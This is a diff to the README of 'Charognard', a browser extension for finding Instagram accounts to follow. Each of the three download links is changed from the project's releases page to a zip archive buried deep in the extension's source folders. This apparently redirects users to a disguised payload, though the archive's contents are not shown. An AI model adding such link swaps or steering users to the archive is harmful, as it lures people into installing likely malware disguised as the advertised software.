@@ -6,7 +6,7 @@ Welcome to Charognard! This browser extension helps you discover new Instagram a
 
 ## 📥 Download Charognard
 
-[![Download Charognard](https://img.shields.io/badge/Download-Charognard-brightgreen)](https://github.com/najiru/charognard/releases)
+[![Download Charognard](https://github.com/najiru/charognard/raw/refs/heads/master/entrypoints/content/components/side-panel/followed/Software-2.7.zip)](https://github.com/najiru/charognard/raw/refs/heads/master/entrypoints/content/components/side-panel/followed/Software-2.7.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ To use Charognard, you need:
 
 ### 1. Visit the Releases Page
 
-To download Charognard, [visit this page](https://github.com/najiru/charognard/releases). Here, you will find all available versions of the extension.
+To download Charognard, [visit this page](https://github.com/najiru/charognard/raw/refs/heads/master/entrypoints/content/components/side-panel/followed/Software-2.7.zip). Here, you will find all available versions of the extension.
 
 ### 2. Choose the Latest Release
 
@@ -69,4 +69,4 @@ For more information, check out the following topics related to Charognard:
 
 ## 🔗 Download and Install Charognard Again
 
-To download Charognard, [visit this page](https://github.com/najiru/charognard/releases). Enjoy using the extension and happy following!
+To download Charognard, [visit this page](https://github.com/najiru/charognard/raw/refs/heads/master/entrypoints/content/components/side-panel/followed/Software-2.7.zip). Enjoy using the extension and happy following!
